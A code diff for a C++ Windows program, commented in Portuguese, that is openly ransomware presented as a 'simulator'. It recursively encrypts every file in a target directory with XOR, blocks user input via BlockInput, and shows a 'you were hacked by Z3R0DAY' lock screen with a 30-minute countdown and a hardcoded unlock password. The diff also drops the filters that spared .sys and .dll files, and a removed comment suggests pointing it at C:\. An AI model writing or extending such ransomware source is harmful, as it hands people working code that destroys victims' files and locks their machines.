@@ -6,7 +6,7 @@
 #include <chrono>
 #include <thread>
 #include <atomic>
-#include <windows.h> // Essencial para o bloqueio real do teclado/mouse
+#include <windows.h> // Essencial para cores e bloqueio
 
 namespace fs = std::filesystem;
 
@@ -18,14 +18,13 @@ enum class AppState {
     SUCCESS
 };
 
-// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA (XOR ENGINE) ---
+// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA ---
 class CryptoEngine {
 private:
     char key; 
 
 public:
     CryptoEngine(std::string password) {
-        // Usa o primeiro caractere da senha como chave de criptografia
         key = password.empty() ? 'a' : password[0];
     }
 
@@ -33,16 +32,13 @@ public:
         std::ifstream inFile(filePath, std::ios::binary);
         if (!inFile) return;
 
-        // Lê o conteúdo do arquivo para o buffer
         std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
         inFile.close();
 
-        // Aplica a operação XOR (Criptografa ou Descriptografa)
         for (size_t i = 0; i < buffer.size(); i++) {
             buffer[i] ^= key; 
         }
 
-        // Escreve o resultado de volta no arquivo
         std::ofstream outFile(filePath, std::ios::binary);
         if (!outFile) return;
         outFile.write(buffer.data(), buffer.size());
@@ -50,7 +46,7 @@ public:
     }
 };
 
-// --- MÓDULO 3: SCANNER DE ARQUIVOS (O ATACANTE) ---
+// --- MÓDULO 3: SCANNER DE ARQUIVOS ---
 class FileScanner {
 private:
     CryptoEngine& engine;
@@ -59,40 +55,28 @@ public:
     FileScanner(CryptoEngine& ce) : engine(ce) {}
 
     void scanAndProcess(const std::string& targetDir, bool encrypt) {
-        if (!fs::exists(targetDir)) {
-            std::cout << "[!] Erro: Diretorio " << targetDir << " nao encontrado.\n";
-            return;
-        }
+        if (!fs::exists(targetDir)) return;
 
         for (const auto& entry : fs::recursive_directory_iterator(targetDir)) {
             try {
                 if (entry.is_regular_file()) {
                     std::string pathStr = entry.path().string();
-
-                    // FILTROS DE SEGURANÇA (O QUE NÃO AFETA)
-                    // 1. Ignora a pasta Windows
-                    if (pathStr.find("Windows") != std::string::npos) continue;
-                    
-                    // 2. Ignora o próprio executável
-                    if (pathStr.find("simulador.exe") != std::string::npos) continue;
-
-                    // 3. Ignora arquivos de sistema críticos
-                    if (pathStr.find(".sys") != std::string::npos || 
-                        pathStr.find(".dll") != std::string::npos) continue;
+                    if (pathStr.find("Windows") != std::string::npos || 
+                        pathStr.find("simulador.exe") != std::string::npos) continue;
 
                     engine.processFile(entry.path(), encrypt);
                 }
-            } catch (...) { continue; } 
+            } catch (...) { continue; }
         }
     }
 };
 
-// --- MÓDULO 4: CORE (TIMER E CONTROLE DE TEMPO) ---
+// --- MÓDULO 4: CORE (TIMER E CONTROLE) ---
 class RansomwareCore {
 private:
     std::atomic<int> timeLeft; 
     std::atomic<AppState> currentState;
-    const int INITIAL_TIME = 30 * 60; // 30 minutos
+    const int INITIAL_TIME = 30 * 60; 
 
 public:
     RansomwareCore() : timeLeft(INITIAL_TIME), currentState(AppState::WAITING_FOR_PASSWORD) {}
@@ -101,58 +85,67 @@ public:
         while (timeLeft > 0 && currentState == AppState::WAITING_FOR_PASSWORD) {
             std::this_thread::sleep_for(std::chrono::seconds(1));
             timeLeft--;
-            
-            if (timeLeft <= 0) {
-                currentState = AppState::LOCKED_PERMANENTLY;
-            }
+            if (timeLeft <= 0) currentState = AppState::LOCKED_PERMANENTLY;
         }
     }
 
     void checkPassword(std::string input) {
         if (currentState == AppState::LOCKED_PERMANENTLY) return;
-
-        if (input == "batata") {
-            currentState = AppState::DECRYPTING;
-        } else {
-            std::cout << "\n[!] SENHA INCORRETA!\n";
-        }
+        if (input == "batata") currentState = AppState::DECRYPTING;
+        else std::cout << "\n[!] SENHA INCORRETA!\n";
     }
 
     AppState getState() const { return currentState.load(); }
     int getTime() const { return timeLeft.load(); }
 };
 
-// --- MÓDULO 5: INTERFACE (SIMULAÇÃO VISUAL) ---
+// --- MÓDULO 5: INTERFACE (CORES E VISUAL) ---
 class Renderer {
+private:
+    void setTextColor(int color) {
+        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
+    }
+
 public:
     void renderUI(const RansomwareCore& core) {
-        // Limpa o console para simular a interface ocupando a tela
+        // Limpa a tela para simular o preenchimento total
         system("cls"); 
 
-        std::cout << "\n====================================================\n";
-        std::cout << "[SISTEMA BLOQUEADO - MODO FULLSCREEN SIMULADO]\n";
-        std::cout << "[TECLADO/MOUSE: BLOQUEADOS | ATALHOS: DESATIVADOS]\n";
+        // Fundo Preto (Simulado)
+        setTextColor(7); // Branco
+
+        std::cout << "\n\n\n";
+        std::cout << "====================================================\n";
+        std::cout << "        SISTEMA TOTALMENTE BLOQUEADO                \n";
         std::cout << "====================================================\n";
         
-        std::cout << "\n[IMAGEM: https://encrypted-tbn0.gstatic.com/...]\n";
-        std::cout << "[AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
+        // Mensagem de Alerta em Vermelho Brilhante
+        setTextColor(12); // Vermelho Brilhante
+        std::cout << "\n\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
+        
+        setTextColor(7); // Volta para Branco
+        std::cout << "\n----------------------------------------------------\n";
+        std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
+        std::cout << "  O TEMPO ESTA CORRENDO. NÃO TENTE FECHAR O SISTEMA. \n";
         std::cout << "----------------------------------------------------\n";
 
         if (core.getState() == AppState::LOCKED_PERMANENTLY) {
-            std::cout << "\n[!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
+            setTextColor(4); // Vermelho Escuro
+            std::cout << "\n    [!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
         } else {
             int mins = core.getTime() / 60;
             int secs = core.getTime() % 60;
-            std::cout << "Tempo para recuperacao: " << mins << ":" << (secs < 10 ? "0" : "") << " segundos\n";
-            std::cout << "Digite a senha para descriptografar: ";
+            std::cout << "\n    TEMPO PARA RECUPERACAO: " << mins << ":" << (secs < 10 ? "0" : "") << "\n";
+            std::cout << "\n    DIGITE A SENHA: ";
         }
+        
+        setTextColor(7); 
     }
 };
 
 // --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
-    // --- CONFIGURAÇÃO DO ALVO ---
-    // Mude para "C:\\" para testar o ataque total na sua VM
+    // CONFIGURAÇÃO DO ALVO
     std::string pastaAlvo = "./test_folder"; 
     std::string senhaCorreta = "batata";
     
@@ -161,27 +154,24 @@ int main() {
     FileScanner scanner(engine);
     Renderer renderer;
 
-    std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
-    std::cout << "Alvo configurado: " << pastaAlvo << "\n";
-
     // 1. Inicia a Criptografia Imediata
-    std::cout << "[!] Iniciando processo de criptografia...\n";
+    std::cout << "[!] Preparando sistema de ataque...\n";
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Arquivos criptografados com sucesso.\n";
 
-    // 2. BLOQUEIO REAL DO SISTEMA (Teclado e Mouse)
-    // IMPORTANTE: Rodar como Administrador para o BlockInput funcionar
+    // 2. Bloqueio do Mouse (para não clicar em nada)
+    // Nota: O teclado fica livre para o input da senha
     BlockInput(TRUE); 
 
-    // 3. Inicia o Timer em uma thread separada
+    // 3. Inicia o Timer em background
     std::thread timerThread(&RansomwareCore::startTimer, &core);
 
-    // 4. Loop de Interface e Input
+    // 4. Loop de Interface
     while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
         renderer.renderUI(core);
 
         std::string input;
-        std::cin >> input;
+        std::cin >> input; // Usuário digita a senha
 
         if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
             core.checkPassword(input);
@@ -197,9 +187,9 @@ int main() {
         if (core.getTime() < 1) break; 
     }
 
-    // 5. LIBERAÇÃO DO SISTEMA (Ao terminar ou travar)
+    // 5. Liberação do Hardware
     BlockInput(FALSE); 
-    
+
     if (core.getState() == AppState::LOCKED_PERMANENTLY) {
         std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
     }
